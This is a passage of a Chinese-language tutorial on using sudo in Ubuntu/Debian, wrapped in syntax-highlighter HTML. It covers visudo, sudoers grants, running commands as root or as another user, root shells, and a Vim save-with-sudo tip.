<code>su</code>，我们可以切换到 root 用户并且执行命令。但是这种方式存在一些缺点：</p>\n<ul>\n<li>我们需要与他人共享 root 的密码。</li>\n<li>因为 root 用户为超级用户，我们不能授予受控的访问权限。</li>\n<li>我们无法审查用户在做什么。</li>\n</ul>\n<p><code>sudo</code> 以独特的方式解决了这些问题。</p>\n<ol>\n<li>首先，我们不需要妥协来分享 root 用户的密码。普通用户使用他们自己的密码就可以用提升的权限来执行命令。</li>\n<li>我们可以控制 <code>sudo</code> 用户的访问，这意味着我们可以限制用户只执行某些命令。</li>\n<li>除此之外，<code>sudo</code> 用户的所有活动都会被记录下来，因此我们可以随时审查进行了哪些操作。在基于 Debian 的 GNU/Linux 中，所有活动都记录在 <code>/var/log/auth.log</code> 文件中。</li>\n</ol>\n<p>本教程后面的部分阐述了这些要点。</p>\n<h3 id=\"toc_3\">实际动手操作 sudo</h3>\n<p>现在，我们对 sudo 有了大致的了解。让我们实际动手操作吧。为了演示，我使用 Ubuntu。但是，其它发行版本的操作应该是相同的。</p>\n<h4 id=\"toc_4\">允许 sudo 权限</h4>\n<p>让我们添加普通用户为 <code>sudo</code> 用户吧。在我的情形中，用户名为 <code>linuxtechi</code>。</p>\n<p>1) 按如下所示编辑 <code>/etc/sudoers</code> 文件：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93302816876379613\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo visudo\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93302816876379613-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93302816876379613-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93302816876379613-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-i\">visudo</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93302816876379613-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>2) 添加以下行来允许用户 <code>linuxtechi</code> 有 sudo 权限：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9330281f000671527\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlinuxtechi ALL=(ALL) ALL\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9330281f000671527-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9330281f000671527-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9330281f000671527-1\"><span class=\"crayon-e\">linuxtechi </span><span class=\"crayon-v\">ALL</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ALL</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ALL</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9330281f000671527-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>上述命令中：</p>\n<ul>\n<li><code>linuxtechi</code> 表示用户名</li>\n<li>第一个 <code>ALL</code> 指示允许从任何终端、机器访问 <code>sudo</code></li>\n<li>第二个 <code>(ALL)</code> 指示 <code>sudo</code> 命令被允许以任何用户身份执行</li>\n<li>第三个 <code>ALL</code> 表示所有命令都可以作为 root 执行</li>\n</ul>\n<h4 id=\"toc_5\">以提升的权限执行命令</h4>\n<p>要用提升的权限执行命令，只需要在命令前加上 <code>sudo</code>，如下所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93302823530696861\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo cat /etc/passwd\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93302823530696861-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93302823530696861-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93302823530696861-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">passwd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93302823530696861-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>当你执行这个命令时，它会询问 <code>linuxtechi</code> 的密码，而不是 root 用户的密码。</p>\n<h4 id=\"toc_6\">以其他用户执行命令</h4>\n<p>除此之外，我们可以使用 <code>sudo</code> 以另一个用户身份执行命令。例如，在下面的命令中，用户 <code>linuxtechi</code> 以用户 <code>devesh</code> 的身份执行命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93302827218323708\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo -u devesh whoami\r\n[sudo] password for linuxtechi:\r\ndevesh\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93302827218323708-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93302827218323708-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93302827218323708-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93302827218323708-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93302827218323708-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sudo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">devesh </span><span class=\"crayon-i\">whoami</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93302827218323708-2\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">sudo</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">password </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93302827218323708-3\"><span class=\"crayon-i\">devesh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93302827218323708-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p></p>\n<h4 id=\"toc_7\">内置命令行为</h4>\n<p><code>sudo</code> 的一个限制是 —— 它无法使用 Shell 的内置命令。例如， <code>history</code> 记录是内置命令，如果你试图用 <code>sudo</code> 执行这个命令，那么会提示如下的未找到命令的错误：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9330282b428923601\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo history\r\n[sudo] password for linuxtechi:\r\nsudo: history: command not found\r\n\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9330282b428923601-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9330282b428923601-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9330282b428923601-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9330282b428923601-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9330282b428923601-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9330282b428923601-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-i\">history</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9330282b428923601-2\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">sudo</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">password </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9330282b428923601-3\"><span class=\"crayon-v\">sudo</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">history</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">command </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">found</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9330282b428923601-4\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa9330282b428923601-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p><strong>访问 root shell</strong></p>\n<p>为了克服上述问题，我们可以访问 root shell，并在那里执行任何命令，包括 Shell 的内置命令。</p>\n<p>要访问 root shell, 执行下面的命令:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9330282e692997281\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo bash\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9330282e692997281-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9330282e692997281-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9330282e692997281-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-i\">bash</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9330282e692997281-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>执行完这个命令后——您将观察到提示符变为井号（<code>#</code>）。</p>\n<h3 id=\"toc_8\">技巧</h3>\n<p>这节我们将讨论一些有用的技巧，这将有助于提高生产力。大多数命令可用于完成日常任务。</p>\n<h4 id=\"toc_9\">以 sudo 用户执行之前的命令</h4>\n<p>让我们假设你想用提升的权限执行之前的命令，那么下面的技巧将会很有用：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93302831046382250\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo !4\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93302831046382250-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93302831046382250-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93302831046382250-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sudo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!</span><span class=\"crayon-cn\">4</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93302831046382250-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>上面的命令将使用提升的权限执行历史记录中的第 4 条命令。</p>\n<h4 id=\"toc_10\">在 Vim 里面使用 sudo 命令</h4>\n<p>很多时候，我们编辑系统的配置文件时，在保存时才意识到我们需要 root 访问权限来执行此操作。因为这个可能让我们丢失我们对文件的改动。没有必要惊慌，我们可以在 Vim 中使用下面的命令来解决这种情况：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93302835827461940\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n:w !sudo tee %\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93302835827461940-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93302835827461940-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93302835827461940-1\"><span class=\"crayon-o\">:</span><span class=\"crayon-v\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!</span><span class=\"crayon-e\">sudo </span><span 